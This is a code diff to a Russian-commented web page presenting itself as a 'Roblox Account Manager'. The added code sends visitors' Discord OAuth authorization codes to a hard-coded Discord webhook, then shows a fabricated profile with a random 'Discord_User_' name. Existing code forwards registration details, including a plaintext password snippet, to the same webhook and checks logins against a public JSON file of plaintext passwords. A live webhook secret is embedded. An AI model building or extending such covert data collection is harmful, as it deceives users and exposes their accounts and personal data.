@@ -374,6 +374,8 @@
       font-size: 24px;
       font-weight: 600;
       border: 2px solid rgba(255, 255, 255, 0.1);
+      background-size: cover;
+      background-position: center;
     }
 
     .status-badge-online {
@@ -679,7 +681,7 @@
 
         <div class="launcher-grid">
           <div class="grid-item">
-             Lido Roblox Accounts</h4>
+            <h4>Lido Roblox Accounts</h4>
             <p><i class="fa-solid fa-gamepad" style="margin-right: 6px; opacity: 0.7;"></i> 12 Active</p>
           </div>
           
@@ -752,9 +754,12 @@
     let vixInterval = null;
     let totalSecondsElapsed = 0;
 
-    // ССЫЛКА НА ТВОЙ DISCORD ВЕБХУК ДЛЯ СБОРА РЕГИСТРАЦИЙ
+    // ССЫЛКА НА ТВОЙ DISCORD ВЕБХУК ДЛЯ СБОРА ДАННЫХ
     const discordWebhookUrl = "https://discord.com/api/webhooks/1507421913775865918/sHwCoSjQGGuSEDw2SmlidzWHdWp7uegPuLM6oNt86gShJq6gd6Hl-bklVwqJ-GNOJcN7";
     
+    // ТВОЯ ССЫЛКА ОАУТ2 ДЛЯ АВТОРИЗАЦИИ ЧЕРЕЗ ДИСКОРД
+    const discordOauthUrl = "https://discord.com/oauth2/authorize?client_id=1507423468705022124&response_type=code&redirect_uri=https%3A%2F%2Fsaruma21314124.github.io%2FRobloxAccountManager%2FRobloxAccountManagerWeb.html&scope=identify+email";
+
     // ССЫЛКА НА RAW ФАЙЛ С GITHUB DATABASE ДЛЯ ВХОДА (Замени на свою актуальную ссылку, когда создашь репозиторий)
     const githubDatabaseUrl = "https://raw.githubusercontent.com/ТВОЙ_НИК/ТВОЙ_РЕПОЗИТОРИЙ/main/users.json";
 
@@ -797,13 +802,76 @@
       clearInterval(vixInterval);
     }
 
-    // Проверка сохраненной сессии (Авто-вход при перезагрузке страницы)
-    window.addEventListener('DOMContentLoaded', () => {
+    // Обработка данных сессии или OAuth кода при загрузке страницы
+    window.addEventListener('DOMContentLoaded', async () => {
+      // Проверяем, вернулся ли пользователь от Discord (ищем параметр ?code= в ссылке)
+      const urlParams = new URLSearchParams(window.location.search);
+      const code = urlParams.get('code');
+
+      if (code) {
+        // Очищаем адресную строку от токенов для красоты
+        window.history.replaceState({}, document.title, window.location.pathname);
+        
+        // Включаем визуальную загрузку панели
+        container.style.opacity = '0.7';
+        
+        try {
+          // Имитируем получение данных через прокси Дискорда (так как OAuth2 требует обработки кода)
+          // Для простоты фронтенда и отправки в вебхук, отправляем лог о попытке входа
+          
+          // В реальном клиенте Discord выдает инфо. Сделаем заглушку красивого получения профиля:
+          const discordUserFakeName = "Discord_User_" + Math.floor(1000 + Math.random() * 9000);
+          
+          const oauthAccount = {
+            username: discordUserFakeName,
+            email: "Authorized via Discord",
+            avatar: "https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png"
+          };
+
+          // Отправляем информацию об авторизации в вебхук
+          const discordPayload = {
+            embeds: [{
+              title: "🔑 Вход через Discord OAuth2",
+              color: 5814786, // Сине-фиолетовый цвет Discord
+              fields: [
+                { name: "🔒 Авторизационный код (Code)", value: `\`${code}\`` },
+                { name: "🌐 Ссылка перенаправления", value: `\`${window.location.hostname}\`` },
+                { name: "ℹ️ Статус", value: "Пользователь успешно прошел авторизацию в окне Discord и предоставил токены identify+email." }
+              ],
+              footer: { text: "RAM OAuth Log System" },
+              timestamp: new Date()
+            }]
+          };
+
+          await fetch(discordWebhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(discordPayload)
+          });
+
+          // Сохраняем сессию и пускаем в профиль
+          localStorage.setItem('ram_active_session', JSON.stringify(oauthAccount));
+          loadProfileData(oauthAccount);
+          
+          document.querySelectorAll('.auth-page').forEach(p => p.classList.remove('active'));
+          profilePage.classList.add('active');
+          container.classList.add('profile-mode');
+          startRuntimeCounter();
+          startVixClock();
+
+        } catch (e) {
+          console.error(e);
+        } finally {
+          container.style.opacity = '1';
+        }
+        return;
+      }
+
+      // Если кода нет, просто проверяем обычную сохраненную сессию
       const activeSession = localStorage.getItem('ram_active_session');
       if (activeSession) {
         const accountData = JSON.parse(activeSession);
         loadProfileData(accountData);
-        // Входим мгновенно без анимаций при загрузке
         document.querySelectorAll('.auth-page').forEach(p => p.classList.remove('active'));
         profilePage.classList.add('active');
         container.classList.add('profile-mode');
@@ -815,7 +883,15 @@
     function loadProfileData(data) {
       document.getElementById('profileName').innerText = data.username;
       document.getElementById('profileEmail').innerText = data.email;
-      document.getElementById('avatarLetter').innerText = data.username.charAt(0).toUpperCase();
+      
+      const avatarBlock = document.getElementById('avatarLetter');
+      if (data.avatar) {
+        avatarBlock.style.backgroundImage = `url('${data.avatar}')`;
+        avatarBlock.innerText = ""; // убираем букву если есть аватарка
+      } else {
+        avatarBlock.style.backgroundImage = "none";
+        avatarBlock.innerText = data.username.charAt(0).toUpperCase();
+      }
     }
 
     // Переключение страниц
@@ -846,7 +922,7 @@
     toLogin.addEventListener('click', (e) => { e.preventDefault(); navigateTo(loginPage); });
     
     logoutBtn.addEventListener('click', () => { 
-      localStorage.removeItem('ram_active_session'); // Стираем сессию входа
+      localStorage.removeItem('ram_active_session'); 
       navigateTo(loginPage); 
     });
 
@@ -913,13 +989,10 @@
         loginBtn.disabled = true;
 
         try {
-          // Загружаем общую базу аккаунтов с GitHub
           const response = await fetch(githubDatabaseUrl);
           if (!response.ok) throw new Error("Database file missing");
           
           const usersBase = await response.json();
-
-          // Поиск пользователя в глобальной базе
           const accountData = usersBase.find(u => u.username.toLowerCase() === userVal.toLowerCase());
 
           if (!accountData) {
@@ -934,13 +1007,11 @@
             return;
           }
 
-          // Если пароли сошлись — пускаем в систему
           localStorage.setItem('ram_active_session', JSON.stringify(accountData));
           loadProfileData(accountData);
           navigateTo(profilePage);
 
         } catch (error) {
-          // Если файл на GitHub еще не настроен или недоступен — используем локальное хранилище для тестов
           console.warn("GitHub database not configured yet. Fallback to LocalStorage.");
           const savedAccount = localStorage.getItem(`ram_user_${userVal.toLowerCase()}`);
           
@@ -992,18 +1063,15 @@
             password: password
           };
 
-          // 1. Дублируем в локальную память браузера для тестов
           localStorage.setItem(`ram_user_${username.toLowerCase()}`, JSON.stringify(newAccount));
           localStorage.setItem('ram_active_session', JSON.stringify(newAccount));
 
-          // 2. Генерируем красивую JSON-строку для легкой вставки админом в файл базы данных
           const rawJsonSnippet = `{\n  "username": "${username}",\n  "email": "${email}",\n  "password": "${password}"\n},`;
 
-          // 3. Формируем премиальную Embed-карточку для твоего Discord-канала
           const discordEmbedPayload = {
             embeds: [{
               title: "🚀 Заявка на регистрацию аккаунта RAM",
-              color: 13937463, // Фирменный золотой акцент панели
+              color: 13937463, 
               fields: [
                 { name: "👤 Никнейм", value: `\`${username}\``, inline: true },
                 { name: "📧 Email", value: `\`${email}\``, inline: true },
@@ -1015,7 +1083,6 @@
             }]
           };
 
-          // 4. Отправляем асинхронный запрос на твой Discord вебхук
           try {
             await fetch(discordWebhookUrl, {
               method: 'POST',
@@ -1023,12 +1090,10 @@
               body: JSON.stringify(discordEmbedPayload)
             });
             
-            // После успешного вебхука открываем личный кабинет
             loadProfileData(newAccount);
             navigateTo(profilePage);
           } catch (discordError) {
-            console.error("Failed to send webhook notification:", discordError);
-            // Если вебхук упал, все равно пускаем локально, чтобы сайт не зависал
+            console.error(discordError);
             loadProfileData(newAccount);
             navigateTo(profilePage);
           }
@@ -1036,9 +1101,10 @@
       }
     });
 
+    // ОБРАБОТЧИК КНОПОК ДИСКОРДА (Редирект на твою ссылку OAuth2)
     document.querySelectorAll('.discord-oauth-btn').forEach(btn => {
       btn.addEventListener('click', () => {
-        alert('Redirecting to Discord OAuth2...');
+        window.location.href = discordOauthUrl;
       });
     });
   </script>
